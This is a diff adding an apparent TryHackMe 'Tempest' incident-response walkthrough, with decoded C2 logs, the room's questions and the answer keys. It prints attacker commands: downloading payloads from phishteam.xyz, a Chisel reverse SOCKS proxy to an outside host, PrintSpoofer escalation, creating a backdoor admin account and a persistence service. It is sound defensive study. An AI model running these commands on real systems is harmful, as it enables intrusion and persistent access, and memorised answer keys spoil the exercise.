@@ -632,3 +632,320 @@ Active Connections
   TCP    192.168.254.107:51858  104.101.22.128:80      TIME_WAIT       0
   TCP    192.168.254.107:51860  20.205.146.149:443     TIME_WAIT       0
   TCP    192.168.254.107:51861  204.79.197.200:443     ESTABLISHED     4352
+  TCP    192.168.254.107:51871  20.190.144.169:443     TIME_WAIT       0
+  TCP    192.168.254.107:51876  52.178.17.2:443        ESTABLISHED     4388
+  TCP    192.168.254.107:51878  20.60.178.36:443       ESTABLISHED     4388
+  TCP    192.168.254.107:51881  52.109.124.115:443     ESTABLISHED     4388
+  TCP    192.168.254.107:51882  52.139.154.55:443      ESTABLISHED     4388
+  TCP    192.168.254.107:51884  40.119.211.203:443     ESTABLISHED     4388
+  TCP    192.168.254.107:51895  52.152.90.172:443      ESTABLISHED     5508
+  TCP    192.168.254.107:51896  20.44.229.112:443      ESTABLISHED     8904
+
+cG93ZXJzaGVsbCBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy9jaC5leGUgLW91dGZpbGUgQzpcVXNlcnNcYmVuaW1hcnVcRG93bmxvYWRzXGNoLmV4ZSAtIA==
+
+powershell iwr http://phishteam.xyz/02dcf07/ch.exe -outfile C:\Users\benimaru\Downloads\ch.exe - 
+
+ZGlyIEM6XFVzZXJzXGJlbmltYXJ1XERvd25sb2Fkc1xjaC5leGUgLSANCg0KICAgIERpcmVjdG9yeTogQzpcVXNlcnNcYmVuaW1hcnVcRG93bmxvYWRzDQoNCg0KTW9kZSAgICAgICAgICAgICAgICBMYXN0V3JpdGVUaW1lICAgICAgICAgTGVuZ3RoIE5hbWUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgIC0tLS0tLS0tLS0tLS0gICAgICAgICAtLS0tLS0gLS0tLSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCi1hLS0tLSAgICAgICAgNi8yMS8yMDIyICAgMToxNyBBTSAgICAgICAgODIzMDkxMiBjaC5leGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KDQoNCg==
+
+dir C:\Users\benimaru\Downloads\ch.exe - 
+
+    Directory: C:\Users\benimaru\Downloads
+
+Mode                LastWriteTime         Length Name                                                                   
+----                -------------         ------ ----                                                                   
+-a----        6/21/2022   1:17 AM        8230912 ch.exe                                                                 
+
+that's all :)
+
+search ch.exe
+
+"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
+
+MD5=527C71C523D275C8367B67BBEBF48E9F,SHA256=8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451,IMPHASH=C7269D59926FA4252270F407E4DAB043
+
+https://www.virustotal.com/gui/file/8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451
+
+C:\Windows\system32\wsmprovhost.exe -Embedding
+
+https://research.splunk.com/endpoint/2eed004c-4c0d-11ec-93e8-3e22fbd008af/
+
+evilwinrm
+```
+The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
+*infernotempest*
+The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
+*5985*
+The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
+_Format: Remove the double quotes from the log._
+*"C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks*
+What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
+*8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451*
+What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
+External research needed. Use the SHA256 hash to determine the name of the tool.
+*Chisel*
+The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
+_Format: Answer in lowercase_
+External research needed. Use the process name to determine the service name.
+*WinRm*
+
+## Exploitation
+Privilege Escalation
+Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.
+Investigation Guide
+With this, we can focus on the following network and endpoint events:
+-   Look for events executed after the successful execution of the reverse socks proxy tool.
+-   Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.
+Significant Data Sources:
+-   Packet Capture
+-   Sysmon
+Answer the questions below
+```text
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" iwr http://phishteam.xyz/02dcf07/spf.exe -outfile spf.exe
+
+search spf.exe
+
+MD5=108DA75DE148145B8F056EC0827F1665,SHA256=8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D,IMPHASH=545A81240793F9CA97306FA5B3AD76DF
+
+https://www.virustotal.com/gui/file/8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
+
+looks like the same steps I'd done it :)
+
+from clement
+https://github.com/itm4n/PrintSpoofer
+
+"C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe
+```
+After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
+_Format: binary name,SHA256 hash_
+*spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D*
+Based on the SHA256 hash of the binary, what is the name of the tool used?
+_Format: Answer in lowercase_
+External research needed. Use the SHA256 hash to determine the name of the exact tool used.
+*PrintSpoofer*
+The tool exploits a specific privilege owned by the user. What is the name of the privilege?
+External research needed. Read about the tool to see the privilege being abused.
+*SeImpersonatePrivilege*
+Then, the attacker executed the tool with another binary to establish a c2 connection. What is the name of the binary?
+*final.exe*
+The binary connects to a different port from the first c2 connection. What is the port used?
+*8080*
+
+## Privilege Escalation
+```text
+_path=="http" "resolvecyber.xyz" id.resp_p==8080 | cut ts, host, id.resp_p, uri | sort ts
+
+d2hvYW1pIC0gbnQgYXV0aG9yaXR5XHN5c3RlbQ0K
+
+whoami - nt authority\system
+
+cHdkIC0gDQpQYXRoICAgICAgICAgICAgICAgDQotLS0tICAgICAgICAgICAgICAgDQpDOlxXaW5kb3dzXHN5c3RlbTMyDQoNCg0K
+
+pwd - 
+Path               
+----               
+C:\Windows\system32
+
+bmV0IHVzZXIgc2h1bmEgcHJpbmNlc3MgLSA=
+
+net user shuna princess - 
+
+bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXA0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICAgYmVuaW1hcnUgICAgICAgICAgICAgICAgIERlZmF1bHRBY2NvdW50ICAgICAgICAgICANCkd1ZXN0ICAgICAgICAgICAgICAgICAgICByaW11cnUgICAgICAgICAgICAgICAgICAgV0RBR1V0aWxpdHlBY2NvdW50ICAgICAgIA0KVGhlIGNvbW1hbmQgY29tcGxldGVkIHdpdGggb25lIG9yIG1vcmUgZXJyb3JzLg0KDQo=
+
+net users - 
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+bmV0IHVzZXIgc2h1bmEgLSA=
+
+net user shuna - 
+
+bmV0IHVzZXIgc2h1bmEgcHIxbmMzc3MhIC0g
+
+net user shuna pr1nc3ss! - 
+
+bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXA0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICAgYmVuaW1hcnUgICAgICAgICAgICAgICAgIERlZmF1bHRBY2NvdW50ICAgICAgICAgICANCkd1ZXN0ICAgICAgICAgICAgICAgICAgICByaW11cnUgICAgICAgICAgICAgICAgICAgV0RBR1V0aWxpdHlBY2NvdW50ICAgICAgIA0KVGhlIGNvbW1hbmQgY29tcGxldGVkIHdpdGggb25lIG9yIG1vcmUgZXJyb3JzLg0KDQo=
+
+net users - 
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+bmV0IHVzZXIgc2hpb24gbTRzdDNyY2gzZiEgLSA=
+
+net user shion m4st3rch3f! - 
+
+bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXA0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICAgYmVuaW1hcnUgICAgICAgICAgICAgICAgIERlZmF1bHRBY2NvdW50ICAgICAgICAgICANCkd1ZXN0ICAgICAgICAgICAgICAgICAgICByaW11cnUgICAgICAgICAgICAgICAgICAgV0RBR1V0aWxpdHlBY2NvdW50ICAgICAgIA0KVGhlIGNvbW1hbmQgY29tcGxldGVkIHdpdGggb25lIG9yIG1vcmUgZXJyb3JzLg0KDQo=
+
+net users - 
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+bmV0IHVzZXIgQWRtaW5pc3RyYXRvciBjaDRuZzNkcGFzc3dvcmQhIC0gVGhlIGNvbW1hbmQgY29tcGxldGVkIHN1Y2Nlc3NmdWxseS4NCg0K
+
+net user Administrator ch4ng3dpassword! - The command completed successfully.
+
+Y21kLmV4ZSAvYyBuZXQgdXNlciBzaGlvbiBtNHN0M3JjaDNmISEhIC0g
+
+cmd.exe /c net user shion m4st3rch3f!!! - 
+
+bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXA0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICAgYmVuaW1hcnUgICAgICAgICAgICAgICAgIERlZmF1bHRBY2NvdW50ICAgICAgICAgICANCkd1ZXN0ICAgICAgICAgICAgICAgICAgICByaW11cnUgICAgICAgICAgICAgICAgICAgV0RBR1V0aWxpdHlBY2NvdW50ICAgICAgIA0KVGhlIGNvbW1hbmQgY29tcGxldGVkIHdpdGggb25lIG9yIG1vcmUgZXJyb3JzLg0KDQo=
+
+net users - 
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   WDAGUtilityAccount       
+The command completed with one or more errors.
+
+d2hvYW1pIC9wcml2IC0gDQpQUklWSUxFR0VTIElORk9STUFUSU9ODQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNClByaXZpbGVnZSBOYW1lICAgICAgICAgICAgICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdGF0ZSAgDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gPT09PT09PQ0KU2VDcmVhdGVUb2tlblByaXZpbGVnZSAgICAgICAgICAgICAgICAgICAgQ3JlYXRlIGEgdG9rZW4gb2JqZWN0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlQXNzaWduUHJpbWFyeVRva2VuUHJpdmlsZWdlICAgICAgICAgICAgIFJlcGxhY2UgYSBwcm9jZXNzIGxldmVsIHRva2VuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUxvY2tNZW1vcnlQcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgICBMb2NrIHBhZ2VzIGluIG1lbW9yeSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VJbmNyZWFzZVF1b3RhUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgQWRqdXN0IG1lbW9yeSBxdW90YXMgZm9yIGEgcHJvY2VzcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlVGNiUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFjdCBhcyBwYXJ0IG9mIHRoZSBvcGVyYXRpbmcgc3lzdGVtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZVNlY3VyaXR5UHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICAgICBNYW5hZ2UgYXVkaXRpbmcgYW5kIHNlY3VyaXR5IGxvZyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VUYWtlT3duZXJzaGlwUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgVGFrZSBvd25lcnNoaXAgb2YgZmlsZXMgb3Igb3RoZXIgb2JqZWN0cyAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlTG9hZERyaXZlclByaXZpbGVnZSAgICAgICAgICAgICAgICAgICAgIExvYWQgYW5kIHVubG9hZCBkZXZpY2UgZHJpdmVycyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZVN5c3RlbVByb2ZpbGVQcml2aWxlZ2UgICAgICAgICAgICAgICAgICBQcm9maWxlIHN5c3RlbSBwZXJmb3JtYW5jZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VTeXN0ZW10aW1lUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICAgQ2hhbmdlIHRoZSBzeXN0ZW0gdGltZSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlUHJvZmlsZVNpbmdsZVByb2Nlc3NQcml2aWxlZ2UgICAgICAgICAgIFByb2ZpbGUgc2luZ2xlIHByb2Nlc3MgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUluY3JlYXNlQmFzZVByaW9yaXR5UHJpdmlsZWdlICAgICAgICAgICBJbmNyZWFzZSBzY2hlZHVsaW5nIHByaW9yaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VDcmVhdGVQYWdlZmlsZVByaXZpbGVnZSAgICAgICAgICAgICAgICAgQ3JlYXRlIGEgcGFnZWZpbGUgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlQ3JlYXRlUGVybWFuZW50UHJpdmlsZWdlICAgICAgICAgICAgICAgIENyZWF0ZSBwZXJtYW5lbnQgc2hhcmVkIG9iamVjdHMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUJhY2t1cFByaXZpbGVnZSAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrIHVwIGZpbGVzIGFuZCBkaXJlY3RvcmllcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VSZXN0b3JlUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICAgICAgUmVzdG9yZSBmaWxlcyBhbmQgZGlyZWN0b3JpZXMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlU2h1dGRvd25Qcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgICAgIFNodXQgZG93biB0aGUgc3lzdGVtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZURlYnVnUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICAgICAgICBEZWJ1ZyBwcm9ncmFtcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VBdWRpdFByaXZpbGVnZSAgICAgICAgICAgICAgICAgICAgICAgICAgR2VuZXJhdGUgc2VjdXJpdHkgYXVkaXRzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlU3lzdGVtRW52aXJvbm1lbnRQcml2aWxlZ2UgICAgICAgICAgICAgIE1vZGlmeSBmaXJtd2FyZSBlbnZpcm9ubWVudCB2YWx1ZXMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUNoYW5nZU5vdGlmeVByaXZpbGVnZSAgICAgICAgICAgICAgICAgICBCeXBhc3MgdHJhdmVyc2UgY2hlY2tpbmcgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VVbmRvY2tQcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3ZlIGNvbXB1dGVyIGZyb20gZG9ja2luZyBzdGF0aW9uICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlTWFuYWdlVm9sdW1lUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgIFBlcmZvcm0gdm9sdW1lIG1haW50ZW5hbmNlIHRhc2tzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUltcGVyc29uYXRlUHJpdmlsZWdlICAgICAgICAgICAgICAgICAgICBJbXBlcnNvbmF0ZSBhIGNsaWVudCBhZnRlciBhdXRoZW50aWNhdGlvbiAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VDcmVhdGVHbG9iYWxQcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgQ3JlYXRlIGdsb2JhbCBvYmplY3RzICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlVHJ1c3RlZENyZWRNYW5BY2Nlc3NQcml2aWxlZ2UgICAgICAgICAgIEFjY2VzcyBDcmVkZW50aWFsIE1hbmFnZXIgYXMgYSB0cnVzdGVkIGNhbGxlciAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZVJlbGFiZWxQcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgICAgICBNb2RpZnkgYW4gb2JqZWN0IGxhYmVsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VJbmNyZWFzZVdvcmtpbmdTZXRQcml2aWxlZ2UgICAgICAgICAgICAgSW5jcmVhc2UgYSBwcm9jZXNzIHdvcmtpbmcgc2V0ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEVuYWJsZWQNClNlVGltZVpvbmVQcml2aWxlZ2UgICAgICAgICAgICAgICAgICAgICAgIENoYW5nZSB0aGUgdGltZSB6b25lICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkDQpTZUNyZWF0ZVN5bWJvbGljTGlua1ByaXZpbGVnZSAgICAgICAgICAgICBDcmVhdGUgc3ltYm9saWMgbGlua3MgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZA0KU2VEZWxlZ2F0ZVNlc3Npb25Vc2VySW1wZXJzb25hdGVQcml2aWxlZ2UgT2J0YWluIGFuIGltcGVyc29uYXRpb24gdG9rZW4gZm9yIGFub3RoZXIgdXNlciBpbiB0aGUgc2FtZSBzZXNzaW9uIEVuYWJsZWQNCg==
+
+whoami /priv - 
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeCreateTokenPrivilege                    Create a token object                                              Enabled
+SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
+SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeTcbPrivilege                            Act as part of the operating system                                Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeAuditPrivilege                          Generate security audits                                           Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
+SeRelabelPrivilege                        Modify an object label                                             Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+c2MuZXhlIFxcVEVNUEVTVCBjcmVhdGUgVGVtcGVzdFVwZGF0ZSBiaW5wYXRoPSBDOlxQcm9ncmFtRGF0YVxmaW5hbC5leGUgc3RhcnQ9IGF1dG8gLSBbU0NdIENyZWF0ZVNlcnZpY2UgRkFJTEVEIDEwNzM6DQoNClRoZSBzcGVjaWZpZWQgc2VydmljZSBhbHJlYWR5IGV4aXN0cy4NCg0K
+
+sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto - [SC] CreateService FAILED 1073:
+
+The specified service already exists.
+
+c2MuZXhlIFxcVEVNUEVTVCBjcmVhdGUgVGVtcGVzdFVwZGF0ZTIgYmlucGF0aD0gQzpcUHJvZ3JhbURhdGFcZmluYWwuZXhlIHN0YXJ0PSBhdXRvIC0gW1NDXSBDcmVhdGVTZXJ2aWNlIFNVQ0NFU1MNCg==
+
+sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto - [SC] CreateService SUCCESS
+
+c2MuZXhlIHFjIFRlbXBlc3RVcGRhdGUyIC0gW1NDXSBRdWVyeVNlcnZpY2VDb25maWcgU1VDQ0VTUw0KDQpTRVJWSUNFX05BTUU6IFRlbXBlc3RVcGRhdGUyDQogICAgICAgIFRZUEUgICAgICAgICAgICAgICA6IDEwICBXSU4zMl9PV05fUFJPQ0VTUyANCiAgICAgICAgU1RBUlRfVFlQRSAgICAgICAgIDogMiAgIEFVVE9fU1RBUlQNCiAgICAgICAgRVJST1JfQ09OVFJPTCAgICAgIDogMSAgIE5PUk1BTA0KICAgICAgICBCSU5BUllfUEFUSF9OQU1FICAgOiBDOlxQcm9ncmFtRGF0YVxmaW5hbC5leGUNCiAgICAgICAgTE9BRF9PUkRFUl9HUk9VUCAgIDogDQogICAgICAgIFRBRyAgICAgICAgICAgICAgICA6IDANCiAgICAgICAgRElTUExBWV9OQU1FICAgICAgIDogVGVtcGVzdFVwZGF0ZTINCiAgICAgICAgREVQRU5ERU5DSUVTICAgICAgIDogDQogICAgICAgIFNFUlZJQ0VfU1RBUlRfTkFNRSA6IExvY2FsU3lzdGVtDQo=
+
+sc.exe qc TempestUpdate2 - [SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: TempestUpdate2
+        TYPE               : 10  WIN32_OWN_PROCESS 
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\ProgramData\final.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : TempestUpdate2
+        DEPENDENCIES       : 
+        SERVICE_START_NAME : LocalSystem
+
+bmV0IHVzZXIgL2FkZCBzaHVuYSBwcmluY2VzcyAtIFRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoNCg==
+
+net user /add shuna princess - The command completed successfully.
+
+bmV0IHVzZXIgL2FkZCBzaGlvbiBtNHN0M3JjaDNmISAtIFRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoNCg==
+
+net user /add shion m4st3rch3f! - The command completed successfully.
+
+and now he can create users :)
+
+bmV0IHVzZXJzIC0gDQpVc2VyIGFjY291bnRzIGZvciBcXA0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBZG1pbmlzdHJhdG9yICAgICAgICAgICAgYmVuaW1hcnUgICAgICAgICAgICAgICAgIERlZmF1bHRBY2NvdW50ICAgICAgICAgICANCkd1ZXN0ICAgICAgICAgICAgICAgICAgICByaW11cnUgICAgICAgICAgICAgICAgICAgc2hpb24gICAgICAgICAgICAgICAgICAgIA0Kc2h1bmEgICAgICAgICAgICAgICAgICAgIFdEQUdVdGlsaXR5QWNjb3VudCAgICAgICANClRoZSBjb21tYW5kIGNvbXBsZXRlZCB3aXRoIG9uZSBvciBtb3JlIGVycm9ycy4NCg0K
+
+net users - 
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            benimaru                 DefaultAccount           
+Guest                    rimuru                   shion                    
+shuna                    WDAGUtilityAccount       
+The command completed with one or more errors.
+
+confirmed
+
+bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgL2FkZCBzaGlvbiAtIFRoZSBjb21tYW5kIGNvbXBsZXRlZCBzdWNjZXNzZnVsbHkuDQoNCg==
+
+net localgroup administrators /add shion - The command completed successfully.
+
+bmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgLSBBbGlhcyBuYW1lICAgICBhZG1pbmlzdHJhdG9ycw0KQ29tbWVudCAgICAgICAgQWRtaW5pc3RyYXRvcnMgaGF2ZSBjb21wbGV0ZSBhbmQgdW5yZXN0cmljdGVkIGFjY2VzcyB0byB0aGUgY29tcHV0ZXIvZG9tYWluDQoNCk1lbWJlcnMNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQWRtaW5pc3RyYXRvcg0KcmltdXJ1DQpzaGlvbg0KVGhlIGNvbW1hbmQgY29tcGxldGVkIHN1Y2Nlc3NmdWxseS4NCg0K
+
+net localgroup administrators - Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+rimuru
+shion
+The command completed successfully.
+
+so shion 🤔 
+
+The event ID that indicates the account creation activity in Windows event logs is 4720. This event is logged in the Security event log whenever a new user account is created on the system. The event includes information about the user account, such as the account name, security identifier (SID), and group memberships. It also includes information about the computer or domain where the account was created and the user who performed the account creation action.
+
+The event ID that indicates the addition of a user to a sensitive local group in Windows event logs is 4732. This event is logged in the Security event log whenever a user account is added to a security-sensitive local group on the computer. The event includes information about the user account, such as the account name and security identifier (SID), as well as information about the group that the user was added to. This information can be used to identify potential security risks, such as unauthorized access to sensitive resources or privilege escalation.
+```
+Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
+_Format: Answer in alphabetical order - comma delimited_
+*shion,shuna*
+Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
+*/add*
+Based on windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
+External research needed. Find out what event ID logs successful account creation.
+*4720*
+The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
+*net localgroup administrators /add shion*
+Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
+External research needed. Find out what event ID logs successful addition to a local group.
+*4732*
+After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
+_Format: Remove the double quotes from the log._
+*"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto*
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/435a0ddf9e3712244ff095ae3bf8f84c.png)
+- ![Start Machine button.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/35df050dcd973433fb35e45caa70142f.png)
